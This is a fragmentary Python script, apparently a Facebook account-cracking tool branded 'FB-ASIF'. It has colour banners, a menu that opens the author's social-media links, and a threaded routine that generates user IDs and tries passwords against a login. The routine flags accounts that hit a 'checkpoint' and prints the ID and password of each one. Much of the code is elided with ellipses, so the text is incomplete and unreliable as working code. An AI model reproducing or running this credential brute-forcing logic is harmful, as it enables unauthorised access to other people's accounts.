...
\x1b[1;93m               \x1b[1;93m
\033[0;92m===========================================\033[0;92m
\033[0;92mTools Creator\033[0;92m=====>\033[0;92mAlax Asif
...
def mainx():
    ...
    if mahin in ["0","07"]:
     ...
     os.system("xdg-open https://github.com/FB-ASIF");mainx()
    elif mahin in ["3","03"]:
     os.system("xdg-open https://www.facebook.com/FB.ASIF.MAHIN.NAME.TOH.SONSO?mibextid=ZbWKwL");mainx()
    elif mahin in ["0","00"]:
     print(f'{gen}{RED}Exited {H}FB-ASIF {P}Terminal ');os.system("xdg-open https://www.facebook.com/FB.ASIF.MAHIN.NAME.TOH.SONSO?mibextid=ZbWKwL");time.sleep(3);os.system('xdg-open https://www.facebook.com/groups/fb.ASIF.cyber/?ref=share');exit()
    else:
     print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/FB.ASIF.MAHIN.NAME.TOH.SONSO?mibextid=ZbWKwL");mainx()
def mainx2():
    os.system("clear")
    banner()
    linex1()
...
def x7():
  ...
  for nmbr in range(limit):
    ...
    user.append(nmp)
  with tred(max_workers=30) as ASIF_xd:
    os.system('clear')
    tl = str(len(user))
    ...
    for guru in user:
      ...
      if hc in ['66','088']:ASIF_xd.submit(m3,idf,pwv)
      elif hc in ['1','03']:ASIF_xd.submit(m3,idf,pwv)
        ...
        try:
           ...
           'sec-ch-ua-mobile': '?0'})
            ...
            if "checkpoint" in session.cookies.get_dict().keys():
             ...
             cp+=1
             if 'y' in cp_xdx:
              print(f'\r{P}[\033[1;28mASIF-CP{P}] \033[1;28m{idf} • {pw}{xxx}')
